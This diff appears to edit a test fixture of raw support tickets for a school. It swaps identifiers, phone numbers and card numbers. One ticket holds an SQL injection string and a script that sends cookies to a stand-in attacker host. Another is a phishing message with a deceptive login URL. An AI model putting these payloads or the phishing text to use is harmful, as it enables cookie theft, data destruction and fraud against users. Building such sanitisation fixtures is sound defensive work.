@@ -1,26 +1,26 @@
 SUPPORT TICKET LOG - EXPORTED FROM EXTERNAL API (raw, unprocessed)
 ====================================================================
 
-Ticket #4471
-From: j.uwimana@alueducation.com
+Ticket #7821
+From: k.mugisha@alueducation.com
 Subject: Cannot access student portal
 Message: Hi team, I've tried logging in from https://portal.alueducation.com/login and also
 www.alueducation.com/help but nothing loads. Can someone call me back? My number is
-+250 788 123 456 or you can try (078) 812-3456 after 2pm. Thanks!
++250 788 456 789 or you can try (078) 900-1122 after 2pm. Thanks!
 
 ------------------------------------------------------------------
 
-Ticket #4472
-From: grace.alumni22@alumni.alueducation.com
+Ticket #7822
+From: diane.alumni19@alumni.alueducation.com
 Subject: Refund for alumni event
 Message: I paid for the alumni dinner using my card ending in a bunch of digits:
-4539 1488 0343 6467 - please refund it to the same card. My backup contact is
-grace.k@gmail.com and my old classmate's number is 0722-334-455.
+4539 1488 0343 6210 - please refund it to the same card. My backup contact is
+grace.k@gmail.com and my old classmate's number is 0733-221-990.
 Reference link: http://events.alueducation.com/refunds?id=4472
 
 ------------------------------------------------------------------
 
-Ticket #4473
+Ticket #7823
 From: not-a-real-email-address
 Subject: (blank)
 Message: '; DROP TABLE users; --  <script>fetch('http://evil-collector.test/steal?c='+document.cookie)</script>
@@ -29,8 +29,8 @@ Card maybe: 1111-2222-3333-4444 lol not real.
 
 ------------------------------------------------------------------
 
-Ticket #4474
-From: peer.helper@si.alueducation.com
+Ticket #7824
+From: mentor.support@si.alueducation.com
 Subject: SI session reminder
 Message: Reminder: Study Intensive session is at 14:30 today, and the makeup session is
 at 6:45 PM. Join via https://meet.alueducation.com/si-room-9. Contact +256-701-222333
@@ -38,7 +38,7 @@ if you have trouble connecting. Some students used a personal email too: kevin_o
 
 ------------------------------------------------------------------
 
-Ticket #4475
+Ticket #7825
 From: badactor@fake-alueducation.com.evil.net
 Subject: URGENT!! verify your account now
 Message: click here now http://192.168.0.1@alueducation.com.verify-now.ru/login and enter
@@ -47,7 +47,7 @@ your card 6011000000000004 immediately or your account will be suspended. Call
 
 ------------------------------------------------------------------
 
-Ticket #4476
+Ticket #7826
 From: finance.office@alueducation.com
 Subject: Tuition installment confirmation
 Message: Your last payment of $450.00 using card 3782 822463 10005 was received.
